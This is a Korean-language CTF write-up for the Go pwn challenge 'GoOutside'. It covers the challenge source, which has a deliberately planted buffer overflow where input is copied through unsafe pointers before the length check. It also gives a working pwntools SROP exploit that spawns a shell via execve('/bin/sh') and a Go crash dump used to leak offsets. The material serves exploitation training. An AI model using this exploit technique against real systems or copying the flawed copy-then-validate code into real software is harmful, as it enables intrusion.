# pwn / GoOutside

## 태그

- go, bof, srop

## 보호기법

```bash
[*] '/mnt/d/hk/.GSHS CTF/GoOutside/make_prob/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RPATH:      b'/home/csh/anaconda3/envs/sage/lib'
```

Partial RELRO이고, PIE가 꺼져 있고, canary가 없습니다. go언어는 기본적으로 모든 보호 기법이 동작하지 않으며 스택 또한 임의로 주소를 초기화하여 새로운 스택 영역을 사용하는 방식으로 설계되어 있습니다.

## 프로그램 분석

```go
func main() {
    var filename [0x100]byte // filename을 0x100 크기로 선언

    for {
        menu()

        reader := bufio.NewReader(os.Stdin)
        input, _ := reader.ReadString('\n')
        choice := 0
        fmt.Sscanf(input, "%d", &choice) // 정수형 입력 받기

        switch choice {
        case 1:
            enterFileName(&filename)
        case 2:
            downloadFile(&filename)
        case 3:
            return
        default:
            fmt.Println("wrong!")
        }
    }
}
```

filename이 0x100만큼 선언되어 있습니다. 1을 입력하면 `enterFileName`, 2를 입력하면 `downloadFile`이 호출됩니다. case 2에 있는 `downloadFile`은 취약점이 없는 함수이기에 분석하지 않겠습니다.

```go
func enterFileName(filename *[0x100]byte) {
    fmt.Print("File name > ")
    os.Stdout.Sync()

    reader := bufio.NewReader(os.Stdin)
    input, _ := reader.ReadBytes('\n') // 문자열 입력 받기

    ptr := unsafe.Pointer(&filename[0])
    for i := 0; i < len(input); i++ {
        *(*byte)(unsafe.Add(ptr, i)) = input[i]
    }

    if len(input) == 0 || len(input) >= 256 {
        return
    } // 길이 검증

    // Add .txt extension
    bytesRead := len(input)
    var idx int8 = -1
    if input[bytesRead-1] != '\n' {
        idx = 0
    }

    pos := bytesRead + int(idx)
    filename[pos] = '.'
    filename[pos+1] = 't'
    filename[pos+2] = 'x'
    filename[pos+3] = 't'
    filename[pos+4] = 0
}
```

입력을 받아서 filename에 길이 제한 없이 그대로 넣음을 알 수 있습니다. 길이 검증을 하는 if문이 있지만, filename에 값을 모두 복사한 후 검사가 이루어지기 때문에 취약한 코드입니다. 원래 go언어는 기본적인 메모리 관리 시스템이 구축되어 있어 안전하지만 본 문제에는 코드를 의도적으로 unsafe로 감싸 `bof`에 취약하게 하였습니다.

## 익스플로잇 설계

동적 디버깅으로 buf 크기를 확인한 후 srop 해주면 됩니다. pie가 꺼져 있어 bss 영역의 주소를 알 수 있기 때문에 bss 영역에 `/bin/sh`를 쓰면 `/bin/sh`가 써져 있는 주소를 알 수 있습니다. 첫 번째 srop로 bss에서의 read를 호출하고, 두 번째 srop로 `/bin/sh`를 작성하고 `execve`를 호출하면 쉘을 딸 수 있습니다. 물론 도커파일을 줘서 libc 함수로 풀 수 있지만 srop가 편할 것입니다.
- 위에서 언급한 대로 스택 또한 임의로 주소를 초기화하여 새로운 스택 영역을 사용하기 때문에 스택 주소를 알 수 있지만, 스택은 실행 환경에 따라 변화할 요소가 많다고 판단하여 bss 영역을 사용하였습니다.

## exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

p = remote('host3.dreamhack.games', 20031)
e = ELF('../make_prob/prob') # 로컬의 문제 파일의 경로로 바꿔주세요
bss = 0x5B4438

pop_rax = 0x000000000040ac84
syscall = 0x000000000040470c
leave_ret = 0x000000000048ba1a

# [1] read syscall to write payload in bss
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss + 0x200
frame.rdx = 0x200
frame.rsp = bss + 0x208
frame.rip = syscall

payload = b'a' * 0x1f0 + p64(bss + 0x200) + p64(pop_rax) + p64(15) + p64(syscall) + bytes(frame)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', payload)
p.sendlineafter(b'> ', b'3')

# [2] write '/bin/sh' and call execve
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bss + 0x200
frame.rip = syscall

payload = b'/bin/sh\x00' + p64(pop_rax) + p64(15) + p64(syscall) + bytes(frame)
sleep(1)
p.send(payload)
p.interactive()
```

## go언어 추가 설명

go언어의 경우 `go build .` 와 같이 코드를 개발하였다면 에러가 발생하였을 때 메모리의 결과를 덤핑하여 출력하는 게 기본 설정입니다. 따라서 Exploit 에 필요한 Offset이나 정보를 Leak할 수 있습니다. 아래 자료는 해당 문제에서 `bof`로 에러를 발생시켰을 때의 결과입니다.

```bash
1. Enter file name
2. Download file
3. exit
> 1
File name > aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
1. Enter file name
2. Download file
3. exit
> 3
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x493321]

goroutine 1 gp=0xc0000061c0 m=0 mp=0x551aa0 [running]:
runtime.throw({0x4942ab?, 0x1000?})
        /usr/lib/go-1.22/src/runtime/panic.go:1023 +0x5e fp=0xc00008dee8 sp=0xc00008deb8 pc=0x434b9e
runtime.sigpanic()
        /usr/lib/go-1.22/src/runtime/signal_unix.go:895 +0x285 fp=0xc00008df48 sp=0xc00008dee8 pc=0x44afa5
main.main()
        /mnt/d/hk/.GSHS CTF/GoOutside/make_prob/prob.go:89 +0x2a1 fp=0xc00008df50 sp=0xc00008df48 pc=0x493321
runtime: g 1: unexpected return pc for main.main called from 0x6161616161616161
stack: frame={sp:0xc00008df48, fp:0xc00008df50} stack=[0xc00008d000,0xc00008e000)
0x000000c00008de48:  0x0000000000000001  0x0000000000000001 
0x000000c00008de58:  0x000000c00008ded5  0x00000000004628b4 <runtime.systemstack+0x0000000000000034> 
0x000000c00008de68:  0x000000c00008dea8  0x0000000000434fe5 <runtime.fatalthrow+0x0000000000000065> 
0x000000c00008de78:  0x000000c00008de88  0x000000c0000061c0 
0x000000c00008de88:  0x0000000000435020 <runtime.fatalthrow.func1+0x0000000000000000>  0x000000c0000061c0 
0x000000c00008de98:  0x0000000000434b9e <runtime.throw+0x000000000000005e>  0x000000c00008deb8 
0x000000c00008dea8:  0x000000c00008ded8  0x0000000000434b9e <runtime.throw+0x000000000000005e> 
0x000000c00008deb8:  0x000000c00008dec0  0x0000000000434bc0 <runtime.throw.func1+0x0000000000000000> 
0x000000c00008dec8:  0x00000000004942ab  0x0000000000000005 
0x000000c00008ded8:  0x000000c00008df38  0x000000000044afa5 <runtime.sigpanic+0x0000000000000285> 
0x000000c00008dee8:  0x00000000004942ab  0x0000000000001000 
0x000000c00008def8:  0x0000000000000000  0x000000c000076008 
0x000000c00008df08:  0x0000000000000002  0x0000000000000002 
0x000000c00008df18:  0x000000c0000061c0  0x0000000000000000 
0x000000c00008df28:  0x000000000000000a  0xffffffffffffffff 
0x000000c00008df38:  0x6161616161616161  0x0000000000493321 <main.main+0x00000000000002a1> 
0x000000c00008df48: <0x6161616161616161 >0x000000c00002810a 
0x000000c00008df58:  0x0000000000000000  0x0000000000000000 
0x000000c00008df68:  0x0000000000000000  0x0100000000000000 
0x000000c00008df78:  0x000000000000000b  0x0000000000000002 
0x000000c00008df88:  0x000000000054c7c0  0x0000000000000000 
0x000000c00008df98:  0x000000000000000a  0x000000000054bd80 
0x000000c00008dfa8:  0x000000000054b9b0  0x0000000000551aa0 
0x000000c00008dfb8:  0x00000000004377e0 <runtime.main.func2+0x0000000000000000>  0x000000c00008df76 
0x000000c00008dfc8:  0x000000c00008dfb8  0x0000000000000000 
0x000000c00008dfd8:  0x00000000004648a1 <runtime.goexit+0x0000000000000001>  0x0000000000000000 
0x000000c00008dfe8:  0x0000000000000000  0x0000000000000000 
0x000000c00008dff8:  0x0000000000000000 

goroutine 2 gp=0xc000006c40 m=nil [force gc (idle)]:
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)
        /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000072fa8 sp=0xc000072f88 pc=0x437a8e
runtime.goparkunlock(...)
        /usr/lib/go-1.22/src/runtime/proc.go:408
runtime.forcegchelper()
        /usr/lib/go-1.22/src/runtime/proc.go:326 +0xb8 fp=0xc000072fe0 sp=0xc000072fa8 pc=0x437918
runtime.goexit({})
        /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000072fe8 sp=0xc000072fe0 pc=0x4648a1
created by runtime.init.6 in goroutine 1
        /usr/lib/go-1.22/src/runtime/proc.go:314 +0x1a

goroutine 3 gp=0xc000007180 m=nil [GC sweep wait]:
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)
        /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000073780 sp=0xc000073760 pc=0x437a8e
runtime.goparkunlock(...)
        /usr/lib/go-1.22/src/runtime/proc.go:408
runtime.bgsweep(0xc00002c150)
        /usr/lib/go-1.22/src/runtime/mgcsweep.go:278 +0x94 fp=0xc0000737c8 sp=0xc000073780 pc=0x423dd4
runtime.gcenable.gowrap1()
        /usr/lib/go-1.22/src/runtime/mgc.go:203 +0x25 fp=0xc0000737e0 sp=0xc0000737c8 pc=0x418905
runtime.goexit({})
        /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000737e8 sp=0xc0000737e0 pc=0x4648a1
created by runtime.gcenable in goroutine 1
        /usr/lib/go-1.22/src/runtime/mgc.go:203 +0x66

goroutine 4 gp=0xc000007340 m=nil [GC scavenge wait]:
runtime.gopark(0xc00002c150?, 0x4b72f0?, 0x1?, 0x0?, 0xc000007340?)
        /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000073f78 sp=0xc000073f58 pc=0x437a8e
runtime.goparkunlock(...)
        /usr/lib/go-1.22/src/runtime/proc.go:408
runtime.(*scavengerState).park(0x551440)
        /usr/lib/go-1.22/src/runtime/mgcscavenge.go:425 +0x49 fp=0xc000073fa8 sp=0xc000073f78 pc=0x4217c9
runtime.bgscavenge(0xc00002c150)
        /usr/lib/go-1.22/src/runtime/mgcscavenge.go:653 +0x3c fp=0xc000073fc8 sp=0xc000073fa8 pc=0x421d5c
runtime.gcenable.gowrap2()
        /usr/lib/go-1.22/src/runtime/mgc.go:204 +0x25 fp=0xc000073fe0 sp=0xc000073fc8 pc=0x4188a5
runtime.goexit({})
        /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000073fe8 sp=0xc000073fe0 pc=0x4648a1
created by runtime.gcenable in goroutine 1
        /usr/lib/go-1.22/src/runtime/mgc.go:204 +0xa5

goroutine 5 gp=0xc000007c00 m=nil [finalizer wait]:
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)
        /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000074620 sp=0xc000074600 pc=0x437a8e
runtime.runfinq()
        /usr/lib/go-1.22/src/runtime/mfinal.go:194 +0x107 fp=0xc0000747e0 sp=0xc000074620 pc=0x417947
runtime.goexit({})
        /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000747e8 sp=0xc0000747e0 pc=0x4648a1
created by runtime.createfing in goroutine 1
        /usr/lib/go-1.22/src/runtime/mfinal.go:164 +0x3d
```
## 레퍼런스

- [srop](https://dreamhack.io/lecture/courses/277)